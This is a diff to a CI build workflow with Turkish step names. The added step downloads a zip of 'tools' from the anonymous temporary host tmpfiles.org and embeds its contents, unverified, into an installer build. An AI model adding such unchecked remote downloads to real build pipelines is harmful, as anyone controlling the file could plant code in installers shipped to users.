@@ -10,6 +10,14 @@ jobs:
         run: |
           openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -in kaynak.enc -out k.tar.gz -k ${{ secrets.PAKET_SIFRE }}
           tar -xzf k.tar.gz
+      - name: Araclari indir ve gom
+        shell: pwsh
+        run: |
+          Invoke-WebRequest "https://tmpfiles.org/dl/1790548317.b709fa55ac9ff375/wwwap6BRQvg1/cwps-tam.zip" -OutFile araclar.zip
+          Expand-Archive araclar.zip -DestinationPath gecici -Force
+          $a = Get-ChildItem -Recurse -Directory -Filter araclar | Select-Object -First 1
+          Copy-Item -Recurse $a.FullName .\araclar
+          Get-ChildItem araclar | Select-Object Name,Length
       - name: Inno kur
         shell: pwsh
         run: choco install innosetup -y --no-progress
